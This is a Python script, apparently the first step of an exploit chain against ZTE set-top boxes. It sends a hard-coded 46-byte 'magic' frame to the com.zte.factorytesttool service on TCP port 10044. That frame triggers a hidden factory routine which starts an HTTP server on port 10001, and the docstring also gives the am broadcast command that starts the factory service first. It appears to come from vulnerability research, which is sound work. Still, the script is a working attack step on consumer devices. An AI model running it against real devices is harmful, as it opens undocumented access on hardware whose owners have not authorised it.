#!/usr/bin/env python3
"""
00_magic_frame.py — OEM factory command frame.

Sends the 46-byte frame accepted by com.zte.factorytesttool's MyService (TCP/10044):

    7e 01 2c ff | 43 x 00 | 7e

Byte 3 (0xff) selects FactoryTest.am() ("OpenHttpServer"), which instantiates
STBFactoryTool.Test.HTTPServer on 127.0.0.1:10001.

Preconditions (see docs/02):
  - the factory activity/service must be running:
      am broadcast -a com.zte.stb.StartHWTest

Usage:
    python3 00_magic_frame.py [host] [port]
"""
import socket
import sys
import time

HEADER = bytes([0x7E, 0x01, 0x2C, 0xFF])
BODY = b"\x00" * 43
TAIL = bytes([0x7E])
FRAME = HEADER + BODY + TAIL          # 46 bytes


def main() -> int:
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 10044
    assert len(FRAME) == 46, len(FRAME)
    try:
        with socket.create_connection((host, port), timeout=5) as s:
            s.sendall(FRAME)
            time.sleep(1.0)
            s.settimeout(2.0)
            try:
                data = s.recv(64)
                print(f"[+] reply: {data.hex(' ')}")
            except socket.timeout:
                print("[+] connected, no immediate reply (expected)")
    except OSError as e:
        print(f"[-] {host}:{port} -> {e}")
        return 1
    print("[+] frame sent; the HTTP server should now listen on 127.0.0.1:10001")
    return 0


if __name__ == "__main__":
    sys.exit(main())
